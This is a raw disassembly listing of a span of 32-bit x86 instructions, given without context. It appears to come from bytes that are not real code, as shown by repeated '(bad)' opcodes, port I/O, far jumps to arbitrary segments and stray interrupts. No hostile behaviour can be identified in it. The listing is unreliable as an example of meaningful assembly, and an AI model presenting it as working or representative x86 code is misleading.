  414d92:	test   BYTE PTR [edx],cl
  414d94:	js     0x414d2f
  414d96:	cld    
  414d97:	push   edx
  414d98:	(bad)  
  414d99:	mov    edi,0xfce375cc
  414d9e:	stc    
  414d9f:	daa    
  414da0:	jne    0x414da1
  414da2:	fild   DWORD PTR [edx+0x19094f54]
  414da8:	cmp    al,0x64
  414daa:	mov    esp,0x1d2f6597
  414daf:	out    0x62,eax
  414db1:	xor    al,0xd3
  414db3:	pop    esp
  414db4:	aas    
  414db5:	les    esp,FWORD PTR ds:0xdbde4b2f
  414dbb:	bound  esi,QWORD PTR [edx+0x4f19e6ab]
  414dc1:	cmp    al,0xab
  414dc3:	cmc    
  414dc4:	psubw  mm3,mm5
  414dc7:	pop    ecx
  414dc8:	arpl   WORD PTR [ecx-0x66],bx
  414dcb:	pusha  
  414dcc:	pop    ds
  414dcd:	bound  ebx,QWORD PTR [ecx-0x49]
  414dd0:	adc    dh,al
  414dd2:	xchg   BYTE PTR [ebp-0x4c2d2210],ch
  414dd8:	fimul  WORD PTR [esi]
  414dda:	test   DWORD PTR [ebp-0x42],edx
  414ddd:	xchg   BYTE PTR [eax+0x70819b10],cl
  414de3:	imul   ebx,DWORD PTR [ecx-0x774a6bc7],0xffffff84
  414dea:	cmp    dl,bh
  414dec:	jecxz  0x414d7d
  414dee:	das    
  414def:	test   al,0x41
  414df1:	or     esp,DWORD PTR [eax+eiz*8]
  414df4:	sub    esp,DWORD PTR [eax-0x3c]
  414df7:	jmp    0x4571:0x8147
  414dfd:	or     eax,0x13f3a330
  414e02:	pop    ecx
  414e03:	test   edx,eax
  414e05:	jbe    0x414e7a
  414e07:	add    edi,eax
  414e09:	lock mov ebp,0x1929ea52
  414e0f:	jmp    0x7821be6f
  414e14:	sub    DWORD PTR [eax+0x2b],esp
  414e17:	mov    al,ds:0x8b050024
  414e1c:	xchg   edi,eax
  414e1d:	(bad)  
  414e1e:	faddp  st(2),st
  414e20:	add    eax,0x16b7f0f3
  414e25:	xor    ebx,DWORD PTR [ebp-0x14]
  414e28:	xchg   ebx,eax
  414e29:	lgs    edx,FWORD PTR [ebx]
  414e2c:	push   esi
  414e2d:	xor    eax,0x77d9f641
  414e32:	xlat   BYTE PTR ds:[ebx]
  414e33:	pop    esi
  414e34:	cmp    eax,DWORD PTR [eax+0x1b]
  414e37:	xchg   edx,eax
  414e38:	inc    esp
  414e39:	ins    BYTE PTR es:[edi],dx
  414e3a:	dec    ebp
  414e3b:	lock fld TBYTE PTR [edx-0x55]
  414e3f:	pop    DWORD PTR [ebp+0x5a]
  414e42:	out    0xf2,eax
  414e44:	jp     0x414dfe
  414e46:	mov    esi,0x3600c7f6
  414e4b:	inc    edx
  414e4c:	in     eax,0xd4
  414e4e:	jmp    0xd27f:0x1b8c0ea4
  414e55:	inc    edi
  414e56:	pop    ss
  414e57:	inc    esp
  414e58:	call   0xffc3:0x45115bce
  414e5f:	imul   ecx,DWORD PTR [ebx+edi*2-0x4a],0x72858180
  414e67:	fs push ds
  414e69:	or     DWORD PTR [eax+0x6d000cc3],edx
  414e6f:	xor    DWORD PTR ds:0x4b076343,eax
  414e75:	push   0x7c7d0fe6
  414e7a:	mov    ebp,0x7b7a5af1
  414e7f:	(bad)  
  414e80:	jmp    0xab1e:0xee83ec7a
  414e87:	xchg   edi,eax
  414e88:	add    DWORD PTR [ecx-0xe],edi
  414e8b:	inc    eax
  414e8c:	ret    
  414e8d:	out    dx,al
  414e8e:	int    0x6a
  414e90:	imul   ebx,ebx,0x2f
  414e93:	mov    edi,0x8d9bf8f2
  414e98:	xlat   BYTE PTR gs:[ebx]
  414e9a:	test   al,0xe6
  414e9c:	sub    cl,BYTE PTR [eax]
  414e9e:	in     eax,dx
  414e9f:	mov    esp,0x2fb7f245
  414ea4:	(bad)  
  414ea5:	or     DWORD PTR fs:[eax+0x26afcd00],esi
  414eac:	js     0x414e67
  414eae:	hlt    
  414eaf:	in     eax,dx
  414eb0:	sub    al,0xd9
  414eb3:	cdq    
  414eb4:	or     bl,BYTE PTR [edi+0x7ee10a4a]
  414eba:	lea    eax,[esi+0x6b7adbb7]
  414ec0:	ret    
  414ec1:	aas    
  414ec2:	adc    ch,BYTE PTR [esi]
  414ec4:	xchg   ebp,eax
  414ec5:	mov    ebp,0x730a4d0
  414eca:	jo     0x414ea4
  414ecc:	cmp    al,0x1d
  414ece:	pusha  
  414ecf:	clc    
  414ed0:	adc    al,0xaa
  414ed2:	sub    eax,DWORD PTR [ebp-0x41]
  414ed5:	into   
  414ed6:	xchg   ebp,eax
  414ed7:	mov    esp,0xa7d16c4c
  414edc:	(bad)  
  414edd:	cwde   
  414ede:	push   sp
  414ee0:	pusha  
  414ee1:	add    BYTE PTR [edi+0x3a],dh
  414ee4:	sub    DWORD PTR [ebx-0x6153bcb9],0x72
  414eeb:	mov    esi,0xa019170d
  414ef0:	cmp    al,0x3
  414ef2:	xchg   esi,eax
  414ef3:	sti    
  414ef4:	sbb    cl,BYTE PTR [eax]
  414ef6:	das    
  414ef7:	dec    ecx
  414ef8:	jge    0x414ead
  414efa:	arpl   si,di
  414efc:	jl     0x414f66
  414efe:	outs   dx,BYTE PTR ds:[esi]
  414eff:	(bad)  
  414f01:	xor    al,0x83
  414f03:	stos   BYTE PTR es:[edi],al
  414f04:	or     edi,ecx
  414f06:	pop    ecx
  414f07:	outs   dx,BYTE PTR ds:[esi]
  414f08:	aam    0x3a
  414f0a:	pop    esi
  414f0b:	mov    cs,WORD PTR [ecx]
  414f0d:	arpl   WORD PTR [esi-0x2b],bx
  414f10:	mov    ?,eax
  414f12:	ret    
  414f13:	mov    al,ds:0xfc02d10d
  414f18:	jmp    0x414f97
  414f1a:	cmc    
  414f1b:	lahf   
  414f1c:	mov    ebx,0x6d4ef6f6
  414f21:	pop    eax
  414f22:	cmp    BYTE PTR [ecx+0x7d8dd68b],ch
  414f28:	mov    BYTE PTR [edx+ebp*4-0x40],dh
  414f2c:	xor    DWORD PTR [ebx],edx
  414f2e:	xchg   BYTE PTR [ebp-0x7c],dh
  414f31:	jo     0x414fb2
  414f33:	mul    DWORD PTR [edx]
  414f35:	fcom   DWORD PTR [edi+edx*1-0x15125ad0]
  414f3c:	add    al,0x3f
  414f3e:	sbb    DWORD PTR [eax+0xa],esp
  414f41:	xlat   BYTE PTR ds:[ebx]
  414f42:	push   edi
  414f43:	lahf   
  414f44:	mov    bh,0xa4
  414f46:	nop
  414f47:	pop    eax
  414f48:	push   ebx
  414f49:	fnstcw WORD PTR cs:[edi]
  414f4c:	out    dx,al
  414f4d:	ins    BYTE PTR es:[edi],dx
  414f4e:	or     eax,0xb051b22d
  414f53:	ss into 
  414f55:	mov    ecx,0xd09501c3
  414f5a:	and    DWORD PTR [eax+0xe],eax
  414f5d:	mov    esp,0x9c5ccb8f
  414f62:	pop    edx
  414f63:	jnp    0x414f62
  414f65:	sbb    bl,cl
  414f67:	repnz out dx,eax
  414f69:	mov    ebx,0x5cf0a58a
  414f6e:	xchg   esi,eax
  414f6f:	arpl   WORD PTR ds:[ebp-0x70],ax
  414f73:	test   BYTE PTR [edx-0x2920c270],bl
  414f79:	and    eax,0xb8a7cda5
  414f7e:	fisttp DWORD PTR [edx-0x1e0724e1]
  414f84:	push   ebp
  414f85:	dec    ebp
  414f86:	or     eax,0xb5dfa515
  414f8b:	leave  
  414f8c:	adc    DWORD PTR [ebx+0x475929ff],esi
  414f92:	pop    esp
  414f93:	or     BYTE PTR [edi],0xdf
  414f96:	dec    esi
  414f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f98:	jnp    0x41500e
  414f9a:	cmp    eax,0xcb4a86ea
  414f9f:	test   esi,ebp
  414fa1:	aad    0x76
  414fa3:	mov    eax,0xaa55ebe7
  414fa8:	(bad)  
  414fa9:	sub    al,0x63
  414fab:	lahf   
  414fac:	int3   
  414fad:	pop    ecx
  414fae:	ins    BYTE PTR es:[edi],dx
  414faf:	sub    al,0xa8
  414fb1:	cld    
  414fb2:	out    dx,al
  414fb3:	icebp  
  414fb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fb5:	inc    ebx
  414fb6:	popa   
  414fb7:	loop   0x414f3a
  414fb9:	cmc    
  414fba:	mov    DWORD PTR [ebp-0x3f23adc0],eax
  414fc0:	in     eax,dx
  414fc1:	ffree  st(3)
  414fc3:	lock xlat BYTE PTR ds:[ebx]
  414fc5:	mov    ch,ah
  414fc7:	mov    edi,DWORD PTR [ebx-0x9]
  414fca:	fldcw  WORD PTR ds:0x133aa99b
  414fd0:	std    
  414fd1:	stos   BYTE PTR es:[edi],al
  414fd2:	mov    edx,0x4915b03c
  414fd7:	in     al,0x53
  414fd9:	pusha  
  414fda:	les    eax,FWORD PTR [eax-0x30]
  414fdd:	dec    eax
  414fde:	adc    ebx,ebx
  414fe0:	and    ecx,DWORD PTR ds:0x872026f2
  414fe6:	(bad)  
  414fe7:	hlt    
  414fe8:	mov    ah,0x42
  414fea:	or     esi,DWORD PTR [ebx+0x6c]
  414fed:	mov    bl,0x87
  414fef:	jnp    0x414ff1
  414ff1:	cmp    BYTE PTR [ebx+0x4b],ah
  414ff4:	fdivr  DWORD PTR [edi]
  414ff6:	outs   dx,BYTE PTR ds:[esi]
  414ff7:	mov    esi,edi
  414ff9:	lods   al,BYTE PTR ds:[esi]
  414ffa:	cli    
  414ffb:	mov    ecx,DWORD PTR [ebx+0x40]
  414ffe:	mov    bl,dh
  415000:	lock adc al,BYTE PTR [ebx-0x3b]
  415004:	mov    ecx,0xbc42324a
  415009:	mov    DWORD PTR [esi-0x5dc825da],esi
  41500f:	imul   edx,eax,0xffffffa7
  415012:	data16 mov BYTE PTR [eax-0x2],bh
  415016:	pop    es
  415017:	js     0x414f9a
  415019:	(bad)  
  41501a:	pop    esi
  41501b:	and    al,0x81
  41501d:	sub    eax,DWORD PTR [edx]
  41501f:	xlat   BYTE PTR ds:[ebx]
  415020:	pop    edi
  415021:	push   0xc3e95530
  415026:	ja     0x415068
  415028:	inc    eax
  415029:	imul   ebp,DWORD PTR [ebx+edi*1+0x28],0xffffffaa
  41502e:	cmp    DWORD PTR [edi-0x291b4e64],esi
  415034:	adc    DWORD PTR [ebx-0x48],esp
  415037:	inc    ecx
  415038:	jne    0x41505f
  41503a:	cmp    dh,BYTE PTR [edx+edx*2]
  41503d:	add    ecx,DWORD PTR [eax]
  41503f:	stos   DWORD PTR es:[edi],eax
  415040:	lods   al,BYTE PTR ds:[esi]
  415041:	sbb    ebp,DWORD PTR [ebp+0x72]
  415044:	pop    ecx
  415045:	sub    eax,0x77f60004
  41504a:	fcmove st,st(3)
  41504c:	loop   0x4150a0
  41504e:	mov    ecx,ds
  415050:	hlt    
  415051:	adc    al,0x1c
  415053:	test   esp,edi
  415055:	pop    edi
  415056:	xor    dh,bl
  415058:	xlat   BYTE PTR ds:[ebx]
  415059:	inc    ecx
  41505a:	aas    
  41505b:	or     ah,bl
  41505d:	stos   DWORD PTR es:[edi],eax
  41505e:	or     eax,0x8bc1fedc
  415063:	adc    al,0x61
  415065:	mov    BYTE PTR [ecx+0x7a],al
  415068:	lods   al,BYTE PTR ds:[esi]
  415069:	retf   
  41506a:	mov    eax,0xd319c48a
  41506f:	(bad)  
  415071:	cmp    DWORD PTR [ebx],edx
  415073:	sub    ebp,DWORD PTR [esp+eax*2+0x8]
  415077:	xor    DWORD PTR [edi],ebp
  415079:	jl     0x41506f
  41507b:	lods   eax,DWORD PTR ds:[esi]
  41507c:	ficom  WORD PTR [edx+eiz*2-0x2c]
  415080:	outs   dx,DWORD PTR ds:[esi]
  415081:	ins    DWORD PTR es:[edi],dx
  415082:	jecxz  0x4150c3
  415084:	or     BYTE PTR [ebx-0x58d1a9d8],0x2
  41508b:	int3   
  41508c:	fdivr  QWORD PTR [esi+0x6d]
  41508f:	enter  0x87b5,0x75
  415093:	gs and eax,0x794d221
  415099:	mov    eax,ds:0x1440455c
  41509e:	in     al,dx
  41509f:	pushf  
  4150a0:	mov    cl,0xc4
  4150a2:	mov    eax,ds:0xc12e2ca4
  4150a7:	(bad)  
  4150a8:	call   0x8578824f
  4150ad:	and    ecx,DWORD PTR [eax-0x3b453e60]
  4150b3:	pop    esp
  4150b4:	and    al,0x55
  4150b6:	out    dx,eax
  4150b7:	xor    al,0xc4
  4150b9:	ss mov edx,0x5ff2346a
  4150bf:	push   es
  4150c0:	dec    ebx
  4150c1:	jo     0x4150f8
  4150c3:	lahf   
  4150c4:	das    
  4150c5:	pop    ecx
  4150c6:	test   DWORD PTR [edi],ebp
  4150c8:	jge    0x4150a2
  4150ca:	xor    cl,BYTE PTR [ebp-0x52]
  4150cd:	ret    0x8a23
  4150d0:	xor    cl,dh
  4150d2:	jmp    0x20de830c
  4150d7:	dec    ecx
  4150d8:	outs   dx,BYTE PTR ds:[esi]
  4150d9:	out    dx,al
  4150da:	dec    edx
  4150db:	push   esi
  4150dc:	push   cs
  4150dd:	ffree  st(4)
  4150df:	add    DWORD PTR ds:0x3365b1b4,ecx
  4150e5:	push   eax
  4150e6:	(bad)  
  4150e7:	fmul   DWORD PTR [eax+0x5d]
  4150ea:	mov    dh,0x5f
  4150ec:	mov    WORD PTR [edi],gs
  4150ee:	std    
  4150ef:	lahf   
  4150f0:	hlt    
  4150f1:	sbb    al,0x34
  4150f3:	aaa    
  4150f4:	in     eax,dx
  4150f5:	jmp    0x41511b
  4150f7:	cmp    esp,DWORD PTR [ebx+0x23e6f528]
  4150fd:	and    al,0xf5
  4150ff:	in     eax,0x8a
  415101:	push   ebp
  415102:	sahf   
  415103:	cmp    al,0x7a
  415105:	dec    BYTE PTR [eax+eax*8+0x73780c89]
  41510c:	(bad)  
  41510d:	rcl    BYTE PTR [edx+0x0],cl
  415110:	cli    
  415111:	add    BYTE PTR [edx-0x27],0x6a
  415115:	inc    edi
  415116:	sbb    bh,BYTE PTR [edi-0x14635e3]
  41511c:	push   eax
  41511d:	adc    esi,ebx
  41511f:	imul   BYTE PTR [ecx-0x70]
  415122:	sbb    eax,edx
  415124:	ret    
  415125:	mov    WORD PTR [edx+edx*2+0x7da9c06e],cs
  41512c:	pop    esi
  41512d:	fbstp  TBYTE PTR [esi+0x7cd0e823]
  415133:	out    dx,eax
  415134:	jmp    0x4150c8
  415136:	adc    al,0x71
  415138:	fisubr WORD PTR [edx-0x48]
  41513b:	pop    es
  41513c:	sbb    BYTE PTR [ecx+0x71],0xe2
  415140:	jns    0x41513d
  415142:	pop    ebx
  415143:	sub    al,0xc4
  415145:	or     esi,DWORD PTR [edx+0x27967cfc]
  41514b:	in     al,dx
  41514c:	xor    ebx,DWORD PTR [edx-0x35]
  41514f:	mov    ds:0x25c55b76,eax
  415154:	cmp    eax,0x509f84bd
  415159:	shl    DWORD PTR [ecx-0x65d20b6a],1
  41515f:	in     al,0x6a
  415161:	pop    eax
  415162:	pop    ebp
  415163:	jp     0x415112
  415165:	adc    BYTE PTR [edi],bl
  415167:	icebp  
  415168:	jb     0x4151a0
  41516a:	sbb    ebx,ebx
  41516c:	push   edx
  41516d:	sub    eax,0x29fbf8b5
  415172:	outs   dx,DWORD PTR ds:[esi]
  415173:	push   ebp
  415174:	int3   
  415175:	jae    0x415166
  415177:	adc    DWORD PTR [edx-0x789a07ab],ebx
  41517d:	dec    edx
  41517e:	or     BYTE PTR [esi+esi*8-0x463f9fb6],bl
  415185:	popf   
  415186:	xchg   DWORD PTR [edi],esi
  415188:	add    DWORD PTR [eax+eax*1],eax
  41518b:	call   0x6d94f63b
  415190:	aam    0xa2
  415192:	fsubr  DWORD PTR es:[edx+ebx*8-0x2b]
  415197:	jecxz  0x4151f9
  415199:	enter  0x71a2,0x17
  41519d:	and    DWORD PTR [ebp-0x4b735add],ecx
  4151a3:	jns    0x415181
  4151a5:	in     al,0x55
  4151a7:	rcl    ecx,0xc
  4151aa:	mov    ah,0xe1
  4151ac:	mul    DWORD PTR [eax+eax*1]
  4151af:	xor    al,0x1
  4151b1:	jbe    0x41519a
  4151b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151b4:	cmp    eax,0x62db586e
  4151b9:	ror    DWORD PTR [edi-0x264f6515],0xe7
  4151c0:	pop    eax
  4151c1:	mov    ds:0xae1c8b23,eax
  4151c6:	dec    ecx
  4151c7:	sbb    eax,0x6daff629
  4151cc:	aaa    
  4151cd:	mov    si,0x42c7
  4151d1:	jmp    0x415243
  4151d3:	imul   DWORD PTR [esi]
  4151d5:	imul   esp,esi,0xffffff91
  4151d8:	mov    ah,0x4d
  4151db:	mov    cl,0x10
  4151dd:	icebp  
  4151de:	or     DWORD PTR [ebx+0x63f48893],ecx
  4151e4:	test   DWORD PTR [ecx],esp
  4151e6:	push   edx
  4151e7:	ins    DWORD PTR es:[edi],dx
  4151e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151e9:	or     esp,DWORD PTR [esp+eiz*2-0x3c3bd13c]
  4151f0:	jp     0x415269
  4151f2:	test   al,0xdd
  4151f4:	inc    eax
  4151f5:	push   ss
  4151f6:	call   0x1e10:0xd62f1e1c
  4151fd:	fwait
  4151fe:	or     BYTE PTR [eiz*2-0x9692e8],bh
  415205:	dec    eax
  415206:	leave  
  415207:	iret   
  415208:	mov    WORD PTR [ecx-0x5f],cs
  41520b:	cmp    al,dh
  41520d:	das    
  41520e:	mov    DWORD PTR [ebp+0x1328f211],eax
  415214:	cmc    
  415215:	out    dx,al
  415216:	mov    WORD PTR [ecx-0x5b],ds
  415219:	xor    DWORD PTR [eax+0x7b],ecx
  41521c:	retf   
  41521d:	xchg   ebx,eax
  41521e:	lods   eax,DWORD PTR ds:[esi]
  41521f:	sbb    BYTE PTR [eax-0x75],dh
  415222:	mov    cl,0xf
  415224:	xor    esp,esp
  415226:	ret    
  415227:	ins    BYTE PTR es:[edi],dx
  415228:	and    esi,DWORD PTR [edi-0x301eb055]
  41522e:	mov    es,WORD PTR [ebp-0x7e]
  415231:	fisttp DWORD PTR [ebp-0x62]
  415234:	(bad)  
  415235:	sub    eax,0x63570566
  41523a:	mov    bh,0xbf
  41523c:	sahf   
  41523d:	popa   
  41523e:	sbb    al,0xf
  415240:	popf   
  415241:	adc    ebp,edi
  415243:	int    0xe0
  415245:	and    ebp,ebx
  415247:	sbb    DWORD PTR [edi],0x35
  41524a:	int    0x4
  41524c:	jno    0x415220
  41524e:	imul   esp,DWORD PTR [eax],0xd29be6bd
  415254:	int3   
  415255:	lods   al,BYTE PTR ds:[esi]
  415256:	push   edi
  415257:	cwde   
  415258:	loope  0x415230
  41525a:	dec    esi
  41525b:	imul   edi,DWORD PTR [eax+eiz*1],0xffffffc7
  41525f:	adc    ebp,DWORD PTR [esi+0x1f7ce408]
  415265:	dec    edx
  415266:	stos   BYTE PTR es:[edi],al
  415267:	loope  0x41529e
  415269:	int    0xfc
  41526b:	dec    ebp
  41526c:	mov    DWORD PTR [edi],eax
  41526e:	xchg   ebp,eax
  41526f:	(bad)  
  415270:	test   DWORD PTR cs:[edi+0x1c],0x8fe27fe7
  415278:	mov    ecx,0xade789c5
  41527d:	nop
  41527e:	add    eax,0x41405a04
  415283:	sub    esi,edi
  415285:	leave  
  415286:	mov    WORD PTR [esi],gs
  415288:	adc    BYTE PTR [eax+ebx*1],dh
  41528b:	mov    ds:0xcf7492a5,al
  415290:	dec    ebx
  415291:	push   ss
  415292:	sbb    al,0x20
  415294:	jno    0x4152ce
  415296:	jno    0x4152f9
  415298:	or     eax,esp
  41529a:	mov    ebx,DWORD PTR [ebx]
  41529c:	dec    esp
  41529d:	popa   
  41529e:	xchg   ebx,eax
  41529f:	repnz xlat BYTE PTR ds:[ebx]
  4152a1:	or     ebx,DWORD PTR [ebp+0x25018294]
  4152a7:	outs   dx,BYTE PTR ds:[esi]
  4152a8:	arpl   ax,bp
  4152aa:	scas   al,BYTE PTR es:[edi]
  4152ab:	stos   BYTE PTR es:[edi],al
  4152ac:	sub    dh,BYTE PTR [ecx-0x7b]
  4152af:	arpl   WORD PTR [eax+eiz*2],bp
  4152b2:	and    al,0xc3
  4152b4:	ja     0x4152c1
  4152b6:	dec    edi
  4152b7:	jns    0x415303
  4152b9:	jae    0x415265
  4152bb:	out    dx,eax
  4152bc:	sub    eax,0x55f35a1f
  4152c1:	mov    al,0xf4
  4152c3:	cdq    
  4152c4:	ins    DWORD PTR es:[edi],dx
  4152c5:	adc    al,0xe8
  4152c7:	test   BYTE PTR [ecx+0x5a],cl
  4152ca:	adc    edi,ebp
  4152cc:	push   ds
  4152cd:	ffreep st(7)
  4152cf:	cmp    al,0x68
  4152d1:	jecxz  0x415331
  4152d3:	sub    al,BYTE PTR [edx+0x33ac665e]
  4152d9:	cmc    
  4152da:	fs sbb eax,0xb8ac83d2
  4152e0:	mov    eax,0xf3562024
  4152e5:	mov    esp,0x7543d60a
  4152ea:	adc    eax,0xd68cfbdd
  4152ef:	and    eax,0x5d30aa64
  4152f4:	sbb    BYTE PTR [edi],cl
  4152f6:	ror    esi,cl
  4152f8:	ins    BYTE PTR es:[edi],dx
  4152f9:	and    al,0x34
  4152fb:	adc    eax,0xe681edd6
  415300:	push   ecx
  415301:	mov    al,0x45
  415303:	outs   dx,DWORD PTR ds:[esi]
  415304:	loop   0x415287
  415306:	mov    ebp,DWORD PTR [esi-0x3149e420]
  41530c:	outs   dx,DWORD PTR ds:[esi]
  41530d:	(bad)  
  41530e:	aaa    
  41530f:	pop    edi
  415310:	icebp  
  415311:	(bad)  
  415312:	fadd   DWORD PTR [ebp+0x6ec7dd38]
  415318:	int3   
  415319:	fild   DWORD PTR ss:[bp+di-0x3f]
  41531f:	adc    al,0x1a
  415321:	push   eax
  415322:	daa    
  415323:	jp     0x4152d4
  415325:	add    al,0x33
  415327:	std    
  415328:	pop    esi
  415329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41532a:	repnz mov WORD PTR [ecx],ds
  41532d:	es inc ebp
  41532f:	jne    0x415360
  415331:	call   0xfb9ec90c
  415336:	call   0xd8fa3986
  41533b:	out    dx,eax
  41533c:	hlt    
  41533d:	push   esi
  41533e:	inc    eax
  41533f:	pop    ebx
  415340:	shr    BYTE PTR [ecx+0x34],cl
  415343:	jae    0x415346
  415345:	in     al,dx
  415346:	(bad)  
  415347:	cld    
  415348:	in     al,dx
  415349:	jge    0x415367
  41534b:	ret    
  41534c:	xor    dh,BYTE PTR [esi]
  41534e:	int    0xe1
  415350:	lods   al,BYTE PTR ds:[esi]
  415351:	es dec esp
  415353:	fmul   st,st(2)
  415355:	sahf   
  415356:	inc    ecx
  415357:	push   edi
  415358:	fst    DWORD PTR [eax-0x4c]
  41535b:	aam    0x41
  41535d:	in     eax,0x31
  41535f:	mov    ecx,0xa1f878ba
  415364:	stos   DWORD PTR es:[edi],eax
  415365:	outs   dx,DWORD PTR ds:[esi]
  415366:	jb     0x4153dc
  415368:	(bad)  
  415369:	(bad)  
  41536a:	xchg   ebp,eax
  41536b:	and    esp,DWORD PTR [ebx-0x55df0ec0]
  415371:	fadd   QWORD PTR [eax+eiz*4-0x630be9e8]
  415378:	fist   WORD PTR [edi]
  41537a:	hlt    
  41537b:	jp     0x4153ca
  41537d:	enter  0xd191,0x23
  415381:	mov    bl,0x3b
  415383:	lods   al,BYTE PTR ds:[esi]
  415384:	pushf  
  415385:	or     BYTE PTR [ebx-0x4ec267ce],bh
  41538b:	not    BYTE PTR [edx]
  41538d:	xchg   DWORD PTR [edi-0x6454372],ebx
  415393:	imul   ebx,edi,0x188a4842
  415399:	mov    esi,DWORD PTR [ecx+0x11]
  41539c:	mov    cx,0x34c7
  4153a0:	jmp    0x1111:0x552ef767
  4153a7:	push   0x968ef9da
  4153ac:	sub    ebp,DWORD PTR [ebx-0x668e21ec]
  4153b2:	xlat   BYTE PTR ds:[ebx]
  4153b3:	or     eax,0xb6ef38c5
  4153b8:	sub    eax,0x753b7342
  4153bd:	cdq    
  4153be:	call   0xc9e0:0x2d1b34e9
  4153c5:	jp     0x4153fd
  4153c7:	ds jl  0x41534e
  4153ca:	icebp  
  4153cb:	outs   dx,DWORD PTR ds:[si]
  4153cd:	jmp    0x35d4:0x2516aa50
  4153d4:	punpcklbw mm4,mm2
  4153d7:	jns    0x415445
  4153d9:	push   ss
  4153da:	mov    WORD PTR [edx-0x7d],ds
  4153dd:	addr16 sti 
  4153df:	ret    
  4153e0:	mov    esp,0x9633b0a4
  4153e5:	sub    ch,BYTE PTR [eax+0x130fc033]
  4153eb:	(bad)  
  4153ec:	es xor eax,0x9938ae7c
  4153f2:	add    bl,BYTE PTR [eax+edx*1+0x60]
  4153f6:	ja     0x41541b
  4153f8:	les    edi,FWORD PTR [esi]
  4153fa:	mov    edx,0x1753dc9f
  4153ff:	fwait
  415400:	arpl   WORD PTR ds:0x89185733,di
  415406:	test   al,0x1b
  415408:	(bad)  
  415409:	or     al,0x1c
  41540b:	out    dx,al
  41540c:	(bad)  
  41540d:	adc    al,0xc6
  41540f:	push   esp
  415410:	lea    ebx,[esi]
  415412:	retf   
  415413:	mov    dl,0x9c
  415415:	xchg   edi,eax
  415416:	ins    DWORD PTR es:[edi],dx
  415417:	pop    edx
  415418:	out    0x2b,al
  41541a:	or     BYTE PTR ds:0x22c3b2de,ch
  415420:	ins    DWORD PTR es:[edi],dx
  415421:	xchg   ebx,eax
  415422:	jmp    0xc812cb3d
  415427:	pusha  
  415428:	and    BYTE PTR [ebp+0x69],ch
  41542b:	add    DWORD PTR [esi],edx
  41542d:	adc    eax,ecx
  41542f:	and    ch,al
  415431:	cs hlt 
  415433:	add    eax,0xf99996fe
  415438:	stos   BYTE PTR es:[edi],al
  415439:	adc    ah,BYTE PTR [ecx]
  41543b:	adc    eax,0x42d13382
  415440:	mov    cl,0xfb
  415442:	adc    ch,BYTE PTR [edi]
  415444:	or     DWORD PTR [edi+0x7aaeefd5],0xffffffab
  41544b:	rcr    BYTE PTR [ebp*1+0x67f64fb2],cl
  415452:	inc    BYTE PTR [eax+ebp*8+0x7a]
  415456:	xchg   ebx,eax
  415457:	shl    BYTE PTR [ecx+0xc],cl
  41545a:	jno    0x41543d
  41545c:	sbb    ebx,ebx
  41545e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41545f:	jno    0x415423
  415461:	ins    BYTE PTR es:[edi],dx
  415462:	push   esp
  415463:	mov    dh,0x28
  415465:	in     al,0xc0
  415467:	ret    
  415468:	push   edi
  415469:	setne  BYTE PTR [ecx]
  41546c:	jge    0x415448
  41546e:	outs   dx,BYTE PTR ds:[esi]
  41546f:	imul   ecx,DWORD PTR [esp+eiz*4-0x50c1b0b6],0xe7b6d54d
  41547a:	loop   0x4154ca
  41547c:	push   ds
  41547d:	out    0x6d,al
  41547f:	and    BYTE PTR [ebp-0x562c5f63],0xb3
  415486:	in     eax,0x8c
  415488:	les    esp,FWORD PTR [eax]
  41548a:	cmp    ch,BYTE PTR [ebx]
  41548c:	gs pop edx
  41548e:	xor    esp,edx
  415490:	int    0x9b
  415492:	dec    edx
  415493:	(bad)  
  415494:	icebp  
  415495:	dec    ebx
  415496:	ins    BYTE PTR es:[edi],dx
  415497:	push   eax
  415498:	leave  
  415499:	push   ebx
  41549a:	pop    ds
  41549b:	pop    ds
  41549c:	lahf   
  41549d:	jnp    0x415424
  41549f:	lea    esi,[ebp+0x60]
  4154a2:	ffree  st(2)
  4154a4:	push   ebx
  4154a5:	scas   eax,DWORD PTR es:[edi]
  4154a6:	fst    DWORD PTR [esi-0x8]
  4154a9:	xor    al,0xcd
  4154ab:	pop    ecx
  4154ac:	call   0xfd78d56f
  4154b1:	or     al,0xce
  4154b3:	jnp    0x415507
  4154b5:	jnp    0x4154e5
  4154b7:	les    edx,FWORD PTR ds:0xbe4b8535
  4154bd:	jb     0x41553c
  4154bf:	lock fisubr WORD PTR [eax-0x32378c45]
  4154c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154c7:	sbb    eax,0x3737160c
  4154cc:	dec    esi
  4154cd:	push   0x47
  4154cf:	loope  0x41549d
  4154d1:	out    dx,eax
  4154d2:	ins    BYTE PTR es:[edi],dx
  4154d3:	les    esi,FWORD PTR [esi]
  4154d5:	dec    ebx
  4154d6:	pop    eax
  4154d7:	sbb    BYTE PTR [edx],bh
  4154d9:	stos   DWORD PTR es:[edi],eax
  4154da:	out    dx,al
  4154db:	add    al,0x2a
  4154dd:	data16 mov bl,0x46
  4154e0:	es dec esi
  4154e2:	push   esp
  4154e3:	mov    esp,DWORD PTR [edx+0x2d3e0115]
  4154e9:	push   es
  4154ea:	mov    esp,0xefdeadd1
  4154ef:	daa    
  4154f0:	aaa    
  4154f1:	push   ss
  4154f2:	enter  0xaba8,0xb1
  4154f6:	sub    DWORD PTR [ebx+0x6724768],ecx
  4154fc:	xor    al,0x93
  4154fe:	hlt    
  4154ff:	dec    esi
  415500:	add    eax,DWORD PTR [esi]
  415502:	lahf   
  415503:	sbb    cl,dl
  415505:	push   esi
  415506:	push   ds
  415507:	sbb    DWORD PTR [eax-0x4e12fe4],eax
  41550d:	stos   BYTE PTR es:[edi],al
  41550e:	sub    ah,BYTE PTR [ebx]
  415510:	inc    eax
  415511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415512:	xlat   BYTE PTR ds:[ebx]
  415513:	fdivr  QWORD PTR [eax]
  415515:	adc    ecx,DWORD PTR ds:0x8bc4ba8d
  41551b:	sub    al,0x5e
  41551d:	mov    al,0x47
  41551f:	aam    0x40
  415521:	ja     0x415530
  415523:	pushf  
  415524:	mov    ebx,0x7eca39a2
  415529:	pop    es
  41552a:	nop
  41552b:	push   cs
  41552c:	ins    BYTE PTR es:[edi],dx
